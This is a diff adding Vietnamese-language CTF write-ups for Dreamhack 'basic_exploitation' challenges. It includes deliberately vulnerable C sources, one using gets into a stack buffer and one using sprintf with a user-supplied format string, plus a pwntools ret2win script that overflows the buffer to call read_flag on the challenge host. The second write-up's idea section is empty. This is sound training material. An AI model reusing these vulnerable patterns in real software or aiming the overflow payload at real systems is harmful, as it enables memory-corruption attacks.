@@ -149,6 +149,124 @@ r.interactive()
 
 </details>
 
+# basic_exploitation_001
+
+## source
+
+<details> <summary> source c <summary>
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <unistd.h>
+
+
+void alarm_handler() {
+    puts("TIME OUT");
+    exit(-1);
+}
+
+
+void initialize() {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+
+    signal(SIGALRM, alarm_handler);
+    alarm(30);
+}
+
+
+void read_flag() {
+    system("cat /flag");
+}
+
+int main(int argc, char *argv[]) {
+
+    char buf[0x80];
+
+    initialize();
+
+    gets(buf);
+
+    return 0;
+}
+```
+
+</details>
+
+## Ý tưởng
+
+- Trong file đã có hàm thực thi cat /flag, kiểm tra checksec
+  ![image](https://user-images.githubusercontent.com/111769169/227443934-77791216-6a8e-48f4-9819-56311dd0a220.png)
+- Ta đoán ngay là ret2win
+
+## Thực thi
+
+- ta cần 132 byte để ow save rbp, sau đó ta sẽ đưa địa chỉ hàm readflag
+
+## Kết quả
+
+![image](https://user-images.githubusercontent.com/111769169/227444598-948620bc-d760-4f63-b31c-47593d75984e.png)
+
+<details> <summary> full script </summary>
+
+```python
+from pwn import *
+
+exe = ELF("./basic_exploitation_001")
+r = remote("host3.dreamhack.games", 9187)
+# r = process(exe.path)
+
+payload = b"a" * 132 + p32(exe.sym['read_flag'])
+
+r.sendline(payload)
+
+r.interactive()
+```
+
+</details>
+
+# basic_exploitation_003
+
+## Source C
+
+<details> <summary> scource C </summary>
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <unistd.h>
+void alarm_handler() {
+    puts("TIME OUT");
+    exit(-1);
+}
+void initialize() {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+    signal(SIGALRM, alarm_handler);
+    alarm(30);
+}
+void get_shell() {
+    system("/bin/sh");
+}
+int main(int argc, char *argv[]) {
+    char *heap_buf = (char *)malloc(0x80);
+    char stack_buf[0x90] = {};
+    initialize();
+    read(0, heap_buf, 0x80);
+    sprintf(stack_buf, heap_buf);
+    printf("ECHO : %s\n", stack_buf);
+    return 0;
+}
+```
+
+</details>
+
+## Ý tưởng
+
+
 # shell_basic
 
 ## Ý tưởng
